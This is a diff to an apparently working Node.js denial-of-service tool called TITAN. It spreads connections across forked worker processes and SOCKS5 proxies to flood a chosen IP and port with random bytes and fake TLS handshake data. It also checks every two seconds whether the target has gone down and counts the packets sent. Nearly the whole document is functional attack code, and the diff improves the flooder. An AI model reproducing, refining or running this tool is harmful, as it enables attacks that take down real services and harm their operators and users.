@@ -3,85 +3,100 @@ const cluster = require("cluster");
 const fs = require("fs");
 const crypto = require("crypto");
 
-// Performance Optimizations
 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 process.on('uncaughtException', () => {});
 process.on('unhandledRejection', () => {});
 
-if (cluster.isMaster) {
-    const target_ip = process.argv[2];
-    const target_port = process.argv[3];
-    const duration = process.argv[4];
-    const threads = process.argv[5];
-    const proxyFile = process.argv[6];
+const target_ip = process.argv[2];
+const target_port = parseInt(process.argv[3]);
+const duration = parseInt(process.argv[4]);
+const threads = parseInt(process.argv[5]);
+const proxyFile = process.argv[6];
 
-    if (!target_ip || !target_port || !duration || !threads || !proxyFile) {
-        console.log(`\x1b[31m[ERROR]\x1b[0m Usage: node TITAN.js <ip> <port> <time> <threads> <proxy.txt>`);
-        process.exit();
+if (cluster.isMaster) {
+    console.log(`\x1b[35m[TITAN-ENGINE]\x1b[0m 🔱 ULTRA-L4 DEPLOYED`);
+    let totalRequests = 0;
+
+    for (let i = 0; i < threads; i++) {
+        const worker = cluster.fork();
+        // Worker se message receive karna count badhane ke liye
+        worker.on('message', () => {
+            totalRequests++;
+        });
     }
 
-    console.log(`\x1b[35m[TITAN-ULTRA]\x1b[0m 🔱 ENGINE DEPLOYED | TARGET: ${target_ip}:${target_port}`);
-
-    // --- LIVE STATUS MONITOR (Every 2 Seconds) ---
-    setInterval(() => {
-        const check = net.connect({host: target_ip, port: parseInt(target_port), timeout: 1000}, () => {
-            console.log(`\x1b[32m[LIVE STATUS] Target ${target_ip} is UP (Responding) ✅\x1b[0m`);
+    // --- LIVE MONITORING FUNCTION (Every 2 Seconds) ---
+    const monitor = setInterval(() => {
+        const check = net.connect(target_port, target_ip, () => {
+            console.log(`\x1b[32m[${new Date().toLocaleTimeString()}]\x1b[0m STATUS: \x1b[1mUP\x1b[0m | PACKETS SENT: \x1b[36m${totalRequests}\x1b[0m`);
             check.destroy();
         });
 
         check.on('error', () => {
-            console.log(`\x1b[31m[LIVE STATUS] Target ${target_ip} is DOWN (Timed Out) 💀\x1b[0m`);
+            console.log(`\x1b[31m[${new Date().toLocaleTimeString()}]\x1b[0m STATUS: \x1b[1mDOWN/TIMEOUT\x1b[0m | PACKETS SENT: \x1b[36m${totalRequests}\x1b[0m`);
             check.destroy();
         });
 
-        check.on('timeout', () => {
-            console.log(`\x1b[31m[LIVE STATUS] Target ${target_ip} is DOWN (No Response) 💀\x1b[0m`);
-            check.destroy();
-        });
-    }, 2000); // Har 2 second mein message aayega
-    
-    for (let i = 0; i < threads; i++) cluster.fork();
+        check.setTimeout(1500, () => check.destroy());
+    }, 2000);
 
     setTimeout(() => {
-        console.log("\x1b[31m[!] ATTACK FINISHED\x1b[0m");
+        clearInterval(monitor);
+        console.log("\n\x1b[31m[!] ATTACK FINISHED\x1b[0m");
         process.exit();
     }, duration * 1000);
 
 } else {
-    // Workers Attack Logic (Wahi same logic jo pehle di thi)
-    const target_ip = process.argv[2];
-    const target_port = parseInt(process.argv[3]);
-    const proxyFile = process.argv[6];
     const proxies = fs.readFileSync(proxyFile, 'utf-8').split('\n').filter(Boolean);
-    const bufferPool = crypto.randomBytes(1024 * 1024); 
 
-    function launchAttack() {
-        const proxyRaw = proxies[Math.floor(Math.random() * proxies.length)].split(':');
+    function attack() {
+        const proxy = proxies[Math.floor(Math.random() * proxies.length)].split(':');
+        
         const socket = net.connect({
-            host: proxyRaw[0],
-            port: parseInt(proxyRaw[1]),
-            noDelay: true,
-            keepAlive: true
+            host: proxy[0],
+            port: proxy[1],
+            allowHalfOpen: true
         });
 
+        socket.setNoDelay(true);
+        socket.setKeepAlive(true, 120000);
+
         socket.on('connect', () => {
-            socket.cork(); 
-            const stream = () => {
-                if (!socket.writable) return;
-                const start = Math.floor(Math.random() * (bufferPool.length - 1024));
-                socket.write(bufferPool.slice(start, start + 1024));
-                setImmediate(stream);
-            };
-            stream();
-            socket.uncork();
+            socket.write(Buffer.from([0x05, 0x01, 0x00]));
+        });
+
+        socket.on('data', (data) => {
+            if (data[0] === 0x05) {
+                const connectReq = Buffer.concat([
+                    Buffer.from([0x05, 0x01, 0x00, 0x03]),
+                    Buffer.from([target_ip.length]),
+                    Buffer.from(target_ip),
+                    Buffer.from([(target_port >> 8) & 0xFF, target_port & 0xFF])
+                ]);
+                socket.write(connectReq);
+
+                const streamData = () => {
+                    if (!socket.writable) return;
+
+                    for(let i = 0; i < 50; i++) {
+                        socket.write(crypto.randomBytes(512));
+                        socket.write(`\x16\x03\x01\x02\x00\x01\x00\x01\xfc\x03\x03${crypto.randomBytes(32).toString('hex')}`);
+                        
+                        // Master process ko batana ki packet bheja gaya hai
+                        process.send('count'); 
+                    }
+                    
+                    setImmediate(streamData);
+                };
+                streamData();
+            }
         });
 
         socket.on('error', () => { socket.destroy(); });
-        socket.setTimeout(5000, () => socket.destroy());
+        socket.on('timeout', () => { socket.destroy(); });
+        setTimeout(() => { socket.destroy(); }, 120000);
     }
 
-    setInterval(() => {
-        for(let i = 0; i < 5; i++) launchAttack();
-    }, 1);
+    setInterval(attack, 5); 
 }
